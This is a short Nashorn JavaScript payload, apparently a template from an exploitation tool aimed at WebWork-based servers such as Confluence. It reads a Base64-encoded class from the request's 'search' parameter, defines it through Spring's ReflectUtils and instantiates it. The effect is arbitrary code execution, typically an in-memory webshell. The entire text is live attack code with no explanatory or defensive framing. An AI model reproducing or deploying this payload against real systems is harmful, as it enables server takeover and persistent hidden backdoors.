load("nashorn:mozilla_compat.js");
importPackage(Packages.java.lang);
var payload = com.opensymphony.webwork.ServletActionContext.getRequest().getParameter("search");
var classBytes = java.util.Base64.getDecoder().decode(payload);
var loader = Thread.currentThread().getContextClassLoader();
var reflectUtilsClass = Class.forName("org.springframework.cglib.core.ReflectUtils",true,loader);
var urls = java.lang.reflect.Array.newInstance(Class.forName("java.net.URL"),0);
var params = java.lang.reflect.Array.newInstance(Class.forName("java.lang.Class"),3);
params[0] = Class.forName("java.lang.String");
params[1] = Class.forName("[B");
params[2] = Class.forName("java.lang.ClassLoader");
var defineClassMethod = reflectUtilsClass.getMethod("defineClass",params);
params =  java.lang.reflect.Array.newInstance(Class.forName("java.lang.Object"),3);
params[0] = "{className}";
params[1] = classBytes;
params[2] = loader;
defineClassMethod.invoke(null,params).newInstance();
"ok";
